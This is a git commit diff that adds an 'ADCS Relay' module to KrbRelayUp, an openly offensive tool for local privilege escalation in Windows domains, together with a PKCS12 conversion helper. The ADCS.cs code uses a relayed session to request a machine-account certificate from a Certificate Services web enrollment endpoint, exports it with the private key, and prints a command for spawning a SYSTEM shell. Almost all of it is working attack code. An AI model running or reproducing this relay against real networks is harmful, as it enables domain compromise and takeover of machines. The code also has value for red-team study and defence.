41a18a82663a79028498d45aaa1985590fee6eda
Dec0ne <malch.mor@gmail.com>
2022-05-23 19:09:02 +0300

    Added ADCS Relay

---
+++ KrbRelayUp/Relay/Attacks/ADCS.cs
@@ -0,0 +1,128 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text.RegularExpressions;
+using Org.BouncyCastle.Security;
+using Org.BouncyCastle.OpenSsl;
+using Org.BouncyCastle.Crypto;
+using Org.BouncyCastle.Crypto.Generators;
+using Org.BouncyCastle.Asn1;
+using Org.BouncyCastle.Asn1.X509;
+using Org.BouncyCastle.Pkcs;
+using Org.BouncyCastle.Asn1.Pkcs;
+using static KrbRelayUp.Relay.Http;
+using KrbRelayUp.Relay.Misc;
+
+namespace KrbRelayUp.Relay.Attacks.Http
+{
+    class ADCS
+    {
+        public static void attack()
+        {
+            var random = new SecureRandom();
+            var keyGenerationParameters = new KeyGenerationParameters(random, 4096);
+
+            RsaKeyPairGenerator generator = new RsaKeyPairGenerator();
+            generator.Init(keyGenerationParameters);
+
+            var keyPair = generator.GenerateKeyPair();
+
+            // set the attributes of the cert
+            var cert_attribs = new Dictionary<DerObjectIdentifier, string>
+            {
+                { X509Name.CN, $"{Options.domain}\\{Environment.MachineName}$" },
+            };
+
+            var subject = new X509Name(cert_attribs.Keys.ToList(), cert_attribs);
+
+            // generate the CSR
+            Console.WriteLine($"[+] Generating CSR");
+            var pkcs10CertificationRequest = new Pkcs10CertificationRequest(PkcsObjectIdentifiers.Sha256WithRsaEncryption.Id, subject, keyPair.Public, null, keyPair.Private);
+            var csr = Convert.ToBase64String(pkcs10CertificationRequest.GetEncoded());
+
+            // correctly format the certificate
+            var formatted_csr = "";
+            formatted_csr += "-----BEGIN CERTIFICATE REQUEST-----";
+            formatted_csr += csr;
+            formatted_csr += "-----END CERTIFICATE REQUEST-----";
+            formatted_csr = formatted_csr.Replace("\n", "").Replace("+", "%2b").Replace(" ", "+");
+
+            Console.WriteLine($"[+] CSR Generated");
+
+            Console.WriteLine($"[+] Requesting certificate for \"{Environment.MachineName}$\" using \"{Options.certificateTemplate}\" template");
+            string data = $"Mode=newreq&CertRequest={formatted_csr}&CertAttrib=CertificateTemplate:{Options.certificateTemplate}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=";
+            HttpWebResponse response = SendWebRequest($"{((Options.https) ? "https://" : "http://")}{Options.caEndpoint}/certsrv/certfnsh.asp", "POST", data, "Cookie", cookies);
+
+            string responseFromServer = new StreamReader(response.GetResponseStream()).ReadToEnd();
+
+            //Console.WriteLine(responseFromServer);
+
+            if (responseFromServer.Contains("locDenied"))
+            {
+                Console.WriteLine($"[-] Certificate request for '{Options.certificateTemplate}' template denied. Try again with a different template.");
+                response.Close();
+                return;
+            }
+
+            // find the req id of the certificate
+            string pattern = @"location=""certnew.cer\?ReqID=(.*?)&";
+            Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);
+
+            string reqid = null;
+            var match = rgx.Match(responseFromServer);
+
+            reqid = match.Groups[1].ToString();
+
+            if (reqid.Length == 0)
+            {
+                Console.WriteLine("[-] Failed to find the certificate request id... dumping all page content.\n");
+                Console.WriteLine(responseFromServer);
+                Environment.Exit(1);
+            }
+
+            response.Close();
+
+            Console.WriteLine("[+] Success (ReqID: " + reqid + ")");
+            Console.WriteLine("[+] Downloading certificate");
+
+            response = SendWebRequest($"{((Options.https) ? "https://" : "http://")}{Options.caEndpoint}/certsrv/certnew.cer?ReqID={reqid}", "GET", "", "Cookie", cookies);
+
+            string certificate = new StreamReader(response.GetResponseStream()).ReadToEnd();
+
+            response.Close();
+
+            Console.WriteLine("[+] Exporting certificate & private key");
+
+            // bundle together certificate and the private key
+            var privatekey = new StringWriter();
+            var pemWriter = new PemWriter(privatekey);
+
+            pemWriter.WriteObject(keyPair.Private);
+            privatekey.Flush();
+            privatekey.Close();
+
+            var bundle = certificate + privatekey.ToString();
+
+            Console.WriteLine("[+] Converting into PKCS12");
+
+            Options.shadowCredCertificate = PKCS12.ConvertToPKCS12(bundle);
+
+            if (Options.phase != Options.PhaseType.Full)
+            {
+                Console.WriteLine("[+] Relay finished successfully!");
+                Console.WriteLine("[+] Run the spawn method for SYSTEM shell:");
+                Console.WriteLine($"    ./KrbRelayUp.exe spawn -m adcs -d {Options.domain} -dc {Options.domainController} -ca {Options.caEndpoint} -ce {Options.shadowCredCertificate}");
+            }
+            else
+            {
+                Console.WriteLine($"[+] Certificate: {Options.shadowCredCertificate}");
+            }
+
+            Options.attackDone = true;
+
+        }
+
+    }
+}
---
+++ KrbRelayUp/Relay/Misc/PKCS12.cs
@@ -0,0 +1,70 @@
+﻿using Org.BouncyCastle.Crypto;
+using Org.BouncyCastle.OpenSsl;
+using Org.BouncyCastle.Pkcs;
+using Org.BouncyCastle.Security;
+using Org.BouncyCastle.X509;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+
+// Based on https://github.com/bats3c/ADCSPwn/blob/master/ADCSPwn/PKCS12%20.cs
+namespace KrbRelayUp.Relay.Misc
+{
+    class PasswordStore : IPasswordFinder
+    {
+        private char[] password;
+
+        public PasswordStore(
+                    char[] password)
+        {
+            this.password = password;
+        }
+
+        public char[] GetPassword()
+        {
+            return (char[])password.Clone();
+        }
+
+    }
+    public class PKCS12
+    {
+        //Based on https://stackoverflow.com/questions/3097642/convert-a-pem-certificate-to-pfx-programmatically-using-openssl
+        public static string ConvertToPKCS12(string plainCert)
+        {
+            using (TextReader sr = new StringReader(plainCert))
+            {
+                IPasswordFinder passwordFinder = new PasswordStore("".ToCharArray());
+                PemReader pemReader = new PemReader(sr, passwordFinder);
+
+
+                Pkcs12Store store = new Pkcs12StoreBuilder().Build();
+                X509CertificateEntry[] chain = new X509CertificateEntry[1];
+                AsymmetricCipherKeyPair privKey = null;
+
+                object o;
+                while ((o = pemReader.ReadObject()) != null)
+                {
+                    if (o is X509Certificate)
+                    {
+                        chain[0] = new X509CertificateEntry((X509Certificate)o);
+                    }
+                    else if (o is AsymmetricCipherKeyPair)
+                    {
+                        privKey = (AsymmetricCipherKeyPair)o;
+                    }
+                }
+
+                store.SetKeyEntry("", new AsymmetricKeyEntry(privKey.Private), chain);
+                var p12file = new MemoryStream();
+                store.Save(p12file, "".ToCharArray(), new SecureRandom());
+                p12file.Close();
+
+                return Convert.ToBase64String(p12file.ToArray());
+            }
+        }
+    }
+}
